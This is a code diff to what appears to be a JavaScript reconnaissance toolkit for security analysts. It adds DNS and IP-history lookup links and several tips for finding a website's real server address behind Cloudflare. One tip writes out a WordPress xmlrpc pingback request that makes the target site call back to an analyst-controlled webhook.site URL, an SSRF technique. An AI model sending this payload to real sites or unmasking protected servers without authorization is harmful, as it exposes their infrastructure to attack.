@@ -644,6 +644,17 @@ const domainTools = [
     buildUrl: (context) => `https://urlscan.io/search/#domain:${encodeURIComponent(context.domainTarget)}`,
   },
   {
+    id: 59,
+    title: "SecurityTrails",
+    category: "RECON",
+    provider: "SecurityTrails",
+    mode: "domain",
+    note: "Opens the DNS records view for the domain.",
+    buildHint: (context) => `${context.domainTarget || "example.com"}/dns`,
+    buildUrl: (context) =>
+      `https://securitytrails.com/domain/${encodeURIComponent(context.domainTarget)}/dns`,
+  },
+  {
     id: 44,
     title: "Wappalyzer",
     category: "INTEL",
@@ -947,14 +958,6 @@ const interestingLinks = [
     buildUrl: () => "https://dnsdumpster.com/",
   },
   {
-    id: "securitytrails",
-    title: "SecurityTrails",
-    provider: "SecurityTrails",
-    note: "Enumerate subdomains.",
-    buildHint: () => "securitytrails.com",
-    buildUrl: () => "https://securitytrails.com/",
-  },
-  {
     id: "github-search-syntax",
     title: "GitHub Search Syntax",
     provider: "GitHub Gist",
@@ -1229,6 +1232,81 @@ const tips = [
       {
         label: "bypass-firewalls-by-DNS-history",
         url: "https://github.com/vincentcox/bypass-firewalls-by-DNS-history",
+      },
+    ],
+  },
+  {
+    section: "Bypasses",
+    id: "wordpress-xmlrpc-exposure-tip",
+    title: "WordPress SSRF Leading to Cloudflare Bypass",
+    body: () => "Send a POST request to /xmlrpc.php with the following body:",
+    code: `<?xml version="1.0" encoding="iso-8859-1"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param>
+      <value>
+        <string>https://webhook.site/e1f36ec8-850a-4cc3-b3dc-c3d19448a6b2</string>
+      </value>
+    </param>
+    <param>
+      <value>
+        <string>https://wordpress.nem.ec/2020/01/22/hello-world/</string>
+      </value>
+    </param>
+  </params>
+</methodCall>`,
+    noteAfter:
+      "Where the WordPress value is a valid link to a blog post of the application, and the webhook is a server waiting for connections from the analyst.",
+    links: [
+      {
+        label: "Source",
+        url: "https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip",
+      },
+    ],
+  },
+  {
+    section: "Bypasses",
+    id: "censys-cert-origin-tip",
+    title: "Looking for Real IPs Through Certificates",
+    body: (context) => {
+      const target = context.domainTarget || context.raw || "example.com";
+      return `Access Censys and look for: "cert.names: \"${target}\" and cert.labels: \"trusted\"." You can also use Shodan or any other tools.`;
+    },
+    links: [
+      {
+        label: "Open in Censys",
+        buildUrl: (context) => {
+          const target = context.domainTarget || context.raw || "example.com";
+          return `https://platform.censys.io/search?q=${encodeURIComponent(
+            `cert.names: "${target}" and cert.labels: "trusted"`
+          )}`;
+        },
+      },
+    ],
+  },
+  {
+    section: "Bypasses",
+    id: "ip-history-tip",
+    title: "Look for IP History",
+    body: (context) => {
+      const target = context.domainTarget || context.raw || "example.com";
+      return `Look for IP history for ${target}. You can use ViewDNS, SecurityTrails, and other historical DNS sources.`;
+    },
+    links: [
+      {
+        label: "Open in ViewDNS",
+        buildUrl: (context) => {
+          const target = context.domainTarget || context.raw || "example.com";
+          return `https://viewdns.info/iphistory/?domain=${encodeURIComponent(target)}`;
+        },
+      },
+      {
+        label: "Open in SecurityTrails",
+        buildUrl: (context) => {
+          const target = context.domainTarget || context.raw || "example.com";
+          return `https://securitytrails.com/domain/${encodeURIComponent(target)}/history/a`;
+        },
       },
     ],
   },
@@ -1724,8 +1802,12 @@ function renderTips(context) {
       const cards = sectionTips
         .map((tip) => {
           const body = tip.body(context);
+          const bodyMarkup = body ? `<p class="resource-note">${escapeHtml(body)}</p>` : "";
           const code = tip.code
             ? `<pre class="tip-code"><code>${escapeHtml(tip.code)}</code></pre>`
+            : "";
+          const noteAfter = tip.noteAfter
+            ? `<p class="resource-note tip-after-note">${escapeHtml(tip.noteAfter)}</p>`
             : "";
           const points = Array.isArray(tip.points) && tip.points.length
             ? `
@@ -1736,25 +1818,31 @@ function renderTips(context) {
             : "";
           const links = (tip.links || [])
             .map(
-              (link) => `
+              (link) => {
+                const url =
+                  typeof link.buildUrl === "function" ? link.buildUrl(context) : link.url;
+
+                return `
                 <a
                   class="tip-link"
-                  href="${escapeHtml(link.url)}"
+                  href="${escapeHtml(url)}"
                   target="_blank"
                   rel="noopener noreferrer"
                 >
                   ${escapeHtml(link.label)}
                 </a>
-              `
+              `;
+              }
             )
             .join("");
 
           return `
             <article class="tip-card">
               <h3 class="resource-title">${escapeHtml(tip.title)}</h3>
-              <p class="resource-note">${escapeHtml(body)}</p>
+              ${bodyMarkup}
               ${points}
               ${code}
+              ${noteAfter}
               <div class="tip-links">${links}</div>
             </article>
           `;
